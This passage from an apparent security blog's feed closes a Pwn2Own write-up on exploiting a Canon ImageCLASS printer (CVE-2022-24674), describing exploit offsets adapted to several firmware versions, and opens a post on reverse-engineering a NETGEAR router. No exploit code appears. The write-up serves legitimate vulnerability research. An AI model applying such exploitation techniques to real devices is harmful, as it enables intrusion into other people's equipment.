+&lt;p&gt;As a side note, disabling this feature makes sense since Google Cloud Print was discontinued on December 31, 2020, and Canon &lt;a href="https://www.usa.canon.com/internet/portal/us/home/support/product-advisories/detail/service%20notice%20google%20termination%20of%20support%20for%20google%20cloud%20print/!ut/p/z1/pVJNb-IwEP0r6YFTldqN88XeEqCCblMK5Su-IMdxgrWJHTmGaP_9GpYeEC3Vai1Z9oze6M17MwCDDcCCHHhJNJeCVCZOsb9NZuNwPBnAl-niZwyjUTx9R_4QwQEC6xMAfnEiCPBF_ZMzglGyWL0kaILg3D_X3wDg2_wrgAFuKM9BSnJEPbcIbYrywHY9r28Tj-R24IVB7riZGzjoiKZCN3oHUkqEFFvBuo5l20bJfE9124Pnn03yA2-l4szkWqYOnDJLSH18SinLilmaqZqLk1WWLKx23zRSaauQ6gNBK7nPrUZxoa-UXknBt418_s5KMytHJYOkNIYQvbO5KCTYnMiZasGGykoquyJGzEfAa1IyalKtXRe-69K8M33iSyY47wcw8of-uP8aw8nMuwKsYtcA-sMBcp6O3Z4Bt8WUlcz-blgkMhSarhUrmGLqYa9Meqd10_7owR400_h1vKV8oLLuwc9KdrLVYHOJBKlxPPjScbMM6wNnHVgKqWrTyfs_rtIYXjFMg0c4c9-mC8_xnGTh_yfD83fbv45BGtzPexB3AD-Cpl4u6xD9tnH61oyKRHuZV9bbYfxq41l0d_cHnjk3Dw!!/dz/d5/L2dBISEvZ0FBIS9nQSEh"&gt;announced&lt;/a&gt; they no longer supported it as of January 1, 2021.&lt;/p&gt;
+&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;In the end, we achieved a perfectly reliable exploit for our printer. It should be noted that our whole work was based on the European version of the printer, while the American version was used during the contest, so a bit of uncertainty still remained on the d-day. Fortunately, we had checked that the firmware of both versions matched beforehand.&lt;/p&gt;
+&lt;p&gt;We also adapted the offsets in our exploit to handle versions &lt;code&gt;9.01&lt;/code&gt;, &lt;code&gt;10.02&lt;/code&gt;, and &lt;code&gt;10.03&lt;/code&gt; (released during the competition) in case the organizers' printer was updated. To do so, we built a script to automatically find the required offsets in the firmware and update our exploit.&lt;/p&gt;
+&lt;p&gt;All in all, we were able to remotely display an image of our choosing on the printer's LCD screen, which counted as a success and earned us 2 Master of Pwn points.&lt;/p&gt;</content><category term="exploitation"></category><category term="Pwn2Own Austin"></category><category term="printers"></category><category term="canon"></category><category term="MF644Cdw"></category><category term="ImageCLASS"></category><category term="CVE-2022-24674"></category><category term="ZDI-22-516"></category><category term="exploitation"></category><category term="memory-corruption"></category></entry><entry><title>Competing in Pwn2Own 2021 Austin: Icarus at the Zenith</title><link href="https://doar-e.github.io/blog/2022/03/26/competing-in-pwn2own-2021-austin-icarus-at-the-zenith/" rel="alternate"></link><published>2022-03-26T08:00:00-07:00</published><updated>2022-03-26T08:00:00-07:00</updated><author><name>Axel "0vercl0k" Souchet</name></author><id>tag:doar-e.github.io,2022-03-26:/blog/2022/03/26/competing-in-pwn2own-2021-austin-icarus-at-the-zenith/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;In 2021, I finally spent some time looking at a consumer router I had been using for years. It started as a weekend project to look at something a bit different from what I was used to. On top of that, it was also a good occasion to play …&lt;/p&gt;</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;In 2021, I finally spent some time looking at a consumer router I had been using for years. It started as a weekend project to look at something a bit different from what I was used to. On top of that, it was also a good occasion to play with new tools, learn new things.&lt;/p&gt;
 &lt;p&gt;I downloaded &lt;a href="https://ghidra-sre.org/"&gt;Ghidra&lt;/a&gt;, grabbed a firmware update and started to reverse-engineer various MIPS binaries that were running on my NETGEAR DGND3700v2 device. I quickly was pretty horrified with what I found and wrote &lt;a href="https://github.com/0vercl0k/longue-vue"&gt;Longue vue 🔭&lt;/a&gt; over the weekend which was a lot of fun (maybe a story for next time?). The security was such a joke that I threw the router away the next day and ordered a new one. I just couldn't believe this had been sitting in my network for several years. Ugh 😞.&lt;/p&gt;
